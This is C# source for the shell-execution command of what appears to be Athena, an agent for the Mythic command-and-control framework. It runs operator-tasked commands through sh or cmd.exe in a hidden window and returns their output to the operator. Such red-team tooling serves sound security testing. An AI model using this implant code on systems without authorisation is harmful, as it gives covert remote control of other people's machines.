using Athena.Models.Mythic.Tasks;
using System;
using System.Diagnostics;

namespace Athena.Commands
{
    public class Execution
    {
        /// <summary>
        /// Execute a shell command
        /// </summary>
        /// <param name="job">The MythicJob containing the execution parameters</param>
        public static string ShellExec (MythicJob job)
        {
            Process process = new Process();
            string shell, output;
            string parameters = job.task.parameters;
            if (OperatingSystem.IsMacOS() || OperatingSystem.IsLinux())
            {
                shell = Environment.GetEnvironmentVariable("SHELL");
                if (string.IsNullOrEmpty(shell))
                {
                    shell = "/bin/sh";
                }
                parameters = "-c " + parameters;
            }
            else if (OperatingSystem.IsWindows())
            {
                shell = Environment.GetEnvironmentVariable("ComSpec");
                if (string.IsNullOrEmpty(shell))
                {
                    shell = "cmd.exe";
                }
                parameters = "/C " + parameters;
            }
            else
            {
                return "Couldn't determine shell.";
            }
            process.StartInfo = new ProcessStartInfo()
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                FileName = shell,
                Arguments = parameters,
                RedirectStandardError = true,
                RedirectStandardOutput = true
            };
            try
            {
                process.ErrorDataReceived += (sender, errorLine) => { if (errorLine.Data is not null) job.taskresult += errorLine.Data + Environment.NewLine;};
                process.OutputDataReceived += (sender, outputLine) => { if (outputLine.Data is not null) job.taskresult += outputLine.Data + Environment.NewLine; job.hasoutput = true;};
                process.Start();
                process.BeginErrorReadLine();
                process.BeginOutputReadLine();
                process.WaitForExit();

                if (process.ExitCode != 0)
                {
                    job.complete = true;
                    job.hasoutput = true;
                    job.errored = true;
                    job.taskresult += "Process exited with code: " + process.ExitCode;
                }
                else
                {
                    job.complete = true;
                    job.hasoutput = true;
                }
                return null;
            }
            catch (Exception e)
            {
                output = process.StandardOutput.ReadToEnd() + Environment.NewLine + process.StandardError.ReadToEnd() + Environment.NewLine + e.Message;
                return output;
            }
        }
    }
}
